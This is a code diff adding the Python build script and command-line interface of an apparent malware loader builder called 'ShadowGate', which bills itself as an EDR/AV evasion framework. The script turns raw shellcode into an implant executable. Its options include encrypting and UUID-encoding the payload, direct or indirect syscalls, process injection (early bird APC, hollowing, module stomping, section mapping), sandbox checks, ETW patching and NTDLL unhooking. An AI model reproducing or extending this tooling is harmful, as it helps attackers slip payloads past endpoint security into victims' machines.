+            print(colored(f"[!] Code generation failed: {e}", Colors.RED))
+            import traceback
+            traceback.print_exc()
+            return False
+        
+        # Write files
+        print(colored("\n[*] Writing source files...", Colors.CYAN))
+        if not self.write_files(files):
+            return False
+        
+        print(colored(f"[+] Source files written to: {self.output_dir}", Colors.GREEN))
+        
+        # Compile (unless no_compile is set)
+        if no_compile:
+            print(colored("\n[*] Compilation skipped (--no-compile)", Colors.YELLOW))
+            print(f"    Source files are in: {self.output_dir}")
+            return True
+        
+        # Check compiler availability
+        if not self.compiler.found_vs:
+            print(colored("\n[!] Visual Studio not found!", Colors.RED))
+            print("    Please run from 'x64 Native Tools Command Prompt for VS'")
+            print("    Or install Visual Studio Build Tools")
+            print(f"    Source files are in: {self.output_dir}")
+            return False
+        
+        # Compile
+        print(colored("\n[*] Starting compilation...", Colors.CYAN))
+        
+        output_exe = self.output_dir / self.config.output_file
+        
+        # Determine which files to compile
+        cpp_files = ['main.cpp', 'syscalls.cpp', 'resolver.cpp', 'injection.cpp', 'evasion.cpp']
+        asm_files = ['asm_syscalls.asm']
+        
+        # Libraries needed
+        libs = [
+            'kernel32.lib',
+            'user32.lib',
+            'advapi32.lib',
+            'ntdll.lib',
+        ]
+        
+        # Add Rpcrt4 for UUID decoding
+        if self.config.encode == ENCODE_UUID:
+            libs.append('Rpcrt4.lib')
+        
+        # Add bcrypt for AES
+        if self.config.encrypt in [ENCRYPT_AES, ENCRYPT_CASCADE] and CRYPTO_AVAILABLE:
+            libs.append('bcrypt.lib')
+        
+        # Preprocessor defines
+        defines = []
+        
+        if self.config.syscall == SYSCALL_DIRECT:
+            defines.append('SYSCALL_METHOD=1')
+        else:
+            defines.append('SYSCALL_METHOD=2')
+        
+        if self.config.resolver == RESOLVER_PEB:
+            defines.append('RESOLVER_METHOD=1')
+        elif self.config.resolver == RESOLVER_FRESH:
+            defines.append('RESOLVER_METHOD=2')
+        else:
+            defines.append('RESOLVER_METHOD=3')
+        
+        success = self.compiler.compile(
+            source_dir=str(self.output_dir),
+            output_file=str(output_exe),
+            cpp_files=cpp_files,
+            asm_files=asm_files,
+            libs=libs,
+            defines=defines,
+            debug=self.config.debug
+        )
+        
+        if success:
+            # Get file info
+            file_size = output_exe.stat().st_size
+            
+            # Calculate final entropy of the executable
+            with open(output_exe, 'rb') as f:
+                exe_data = f.read()
+            final_entropy = self.entropy_analyzer.calculate_entropy(exe_data)
+            
+            print(colored("\n" + "=" * 60, Colors.GREEN))
+            print(colored("  BUILD SUCCESSFUL!", Colors.GREEN + Colors.BOLD))
+            print(colored("=" * 60, Colors.GREEN))
+            print(f"  Output:   {output_exe}")
+            print(f"  Size:     {file_size:,} bytes")
+            print(f"  Entropy:  {final_entropy:.2f}")
+            print(colored("=" * 60 + "\n", Colors.GREEN))
+            
+            return True
+        else:
+            print(colored("\n[!] Compilation failed!", Colors.RED))
+            print(f"    Check source files in: {self.output_dir}")
+            return False
+
+
+# ============================================================================
+# CLI Argument Parser
+# ============================================================================
+
+def create_parser() -> argparse.ArgumentParser:
+    """Create the argument parser"""
+    parser = argparse.ArgumentParser(
+        prog='shadowgate',
+        description='ShadowGate Builder v3.0 - Ultimate EDR/AV Evasion Framework',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Examples:
+  %(prog)s -i payload.bin -o implant.exe
+  %(prog)s -i payload.bin -o implant.exe --syscall indirect --inject earlybird
+  %(prog)s -i payload.bin -o implant.exe --encrypt cascade --encode uuid
+  %(prog)s -i payload.bin -o implant.exe --profile stealth
+  %(prog)s --save-profile myprofile --syscall indirect --inject mapping
+
+Syscall Methods:
+  direct    - Inline syscall instruction (Hell's Gate style)
+  indirect  - Jump to NTDLL's syscall instruction (HookChain style)
+
+Resolver Methods:
+  peb       - Walk PEB to find NTDLL (no API calls)
+  fresh     - Load clean NTDLL from disk
+  hybrid    - PEB first, fresh as fallback
+
+Injection Methods:
+  stomp      - Module stomping (local, overwrites DLL)
+  earlybird  - Early Bird APC (remote, new suspended process)
+  threadpool - Remote thread (remote, existing process)
+  hollowing  - Process hollowing (remote, new process)
+  mapping    - Section mapping (remote, existing process)
+        '''
+    )
+    
+    # Required arguments
+    parser.add_argument('-i', '--input',
+                        required=True,
+                        help='Input shellcode file (.bin)')
+    
+    parser.add_argument('-o', '--output',
+                        default='shadowgate.exe',
+                        help='Output executable name (default: shadowgate.exe)')
+    
+    # Syscall options
+    syscall_group = parser.add_argument_group('Syscall Options')
+    syscall_group.add_argument('--syscall',
+                               choices=[SYSCALL_DIRECT, SYSCALL_INDIRECT],
+                               default=SYSCALL_INDIRECT,
+                               help='Syscall method (default: indirect)')
+    
+    syscall_group.add_argument('--resolver',
+                               choices=[RESOLVER_PEB, RESOLVER_FRESH, RESOLVER_HYBRID],
+                               default=RESOLVER_HYBRID,
+                               help='NTDLL resolver method (default: hybrid)')
+    
+    # Obfuscation options
+    obfuscation_group = parser.add_argument_group('Obfuscation Options')
+    obfuscation_group.add_argument('--strings',
+                                   choices=[STRINGS_NONE, STRINGS_DJB2, STRINGS_XOR, STRINGS_STACK],
+                                   default=STRINGS_DJB2,
+                                   help='String hiding method (default: djb2)')
+    
+    obfuscation_group.add_argument('--encrypt',
+                                   choices=[ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CASCADE],
+                                   default=ENCRYPT_CASCADE,
+                                   help='Encryption method (default: cascade)')
+    
+    obfuscation_group.add_argument('--encode',
+                                   choices=[ENCODE_UUID, ENCODE_MAC, ENCODE_IPV4, ENCODE_RAW],
+                                   default=ENCODE_UUID,
+                                   help='Shellcode encoding (default: uuid)')
+    
+    # Injection options
+    injection_group = parser.add_argument_group('Injection Options')
+    injection_group.add_argument('--inject',
+                                 choices=[INJECT_STOMP, INJECT_EARLYBIRD, INJECT_THREADPOOL,
+                                         INJECT_HOLLOWING, INJECT_MAPPING],
+                                 default=INJECT_EARLYBIRD,
+                                 help='Injection method (default: earlybird)')
+    
+    injection_group.add_argument('--target',
+                                 default='notepad.exe',
+                                 help='Target process for injection (default: notepad.exe)')
+    
+    # Evasion options
+    evasion_group = parser.add_argument_group('Evasion Options')
+    evasion_group.add_argument('--sandbox', action='store_true', default=True,
+                               help='Enable sandbox evasion checks (default: enabled)')
+    evasion_group.add_argument('--no-sandbox', action='store_true',
+                               help='Disable sandbox evasion checks')
+    
+    evasion_group.add_argument('--etw', action='store_true', default=True,
+                               help='Enable ETW patching (default: enabled)')
+    evasion_group.add_argument('--no-etw', action='store_true',
+                               help='Disable ETW patching')
+    
+    evasion_group.add_argument('--unhook', action='store_true', default=False,
+                               help='Enable NTDLL unhooking (default: disabled)')
+    
+    evasion_group.add_argument('--sleep', type=int, default=0,
+                               help='Initial sleep in seconds (default: 0)')
+    
+    # Build options
+    build_group = parser.add_argument_group('Build Options')
+    build_group.add_argument('--no-compile', action='store_true',
+                             help='Generate source files only, do not compile')
+    
+    build_group.add_argument('--debug', action='store_true',
+                             help='Build with debug output enabled')
+    
+    # Profile options
+    profile_group = parser.add_argument_group('Profile Options')
+    profile_group.add_argument('--profile',
+                               help='Load configuration from saved profile')
+    
+    profile_group.add_argument('--save-profile',
+                               help='Save current configuration to profile')
+    
+    profile_group.add_argument('--list-profiles', action='store_true',
+                               help='List available profiles')
+    
+    # Misc
+    parser.add_argument('-v', '--verbose', action='store_true',
+                        help='Verbose output')
+    
+    parser.add_argument('--version', action='version',
+                        version=f'%(prog)s {VERSION}')
+    
+    return parser
+
+
+def args_to_config(args: argparse.Namespace) -> BuildConfig:
+    """Convert parsed arguments to BuildConfig"""
+    config = BuildConfig()
+    
+    config.input_file = args.input
+    config.output_file = args.output
+    config.syscall = args.syscall
+    config.resolver = args.resolver
+    config.strings = args.strings
+    config.encrypt = args.encrypt
+    config.encode = args.encode
+    config.inject = args.inject
+    config.target = args.target
+    config.sandbox = not args.no_sandbox if hasattr(args, 'no_sandbox') else args.sandbox
+    config.etw = not args.no_etw if hasattr(args, 'no_etw') else args.etw
+    config.unhook = args.unhook
+    config.sleep = args.sleep
+    config.debug = args.debug
+    
+    return config
+
+
+# ============================================================================
+# Main Entry Point
+# ============================================================================
+
+def main():
+    """Main entry point"""
+    parser = create_parser()
+    args = parser.parse_args()
+    
+    # Handle profile listing
+    if args.list_profiles:
+        manager = ConfigManager()
+        profiles = manager.list_profiles()
+        if profiles:
+            print("Available profiles:")
+            for p in profiles:
+                print(f"  - {p}")
+        else:
+            print("No profiles saved yet.")
+        return 0
+    
+    # Load profile if specified
+    config = None
+    if args.profile:
+        manager = ConfigManager()
+        config = manager.load_profile(args.profile)
+        if not config:
+            print(colored(f"[!] Profile '{args.profile}' not found", Colors.RED))
+            return 1
+        print(colored(f"[+] Loaded profile: {args.profile}", Colors.GREEN))
+        
+        # Override with command line arguments if provided
+        config.input_file = args.input
+        config.output_file = args.output
+        if args.syscall != SYSCALL_INDIRECT:  # Non-default
+            config.syscall = args.syscall
+        # ... similar for other args
+    else:
+        config = args_to_config(args)
+    
+    # Save profile if requested
+    if args.save_profile:
+        manager = ConfigManager()
+        if manager.save_profile(args.save_profile, config):
+            print(colored(f"[+] Profile saved: {args.save_profile}", Colors.GREEN))
+        else:
+            print(colored(f"[!] Failed to save profile", Colors.RED))
+        
+        # If only saving profile (no input file), exit
+        if not args.input:
+            return 0
+    
+    # Build
+    builder = ShadowGateBuilder(config)
+    success = builder.build(no_compile=args.no_compile)
+    
+    return 0 if success else 1
+
+
+if __name__ == '__main__':
+    sys.exit(main())
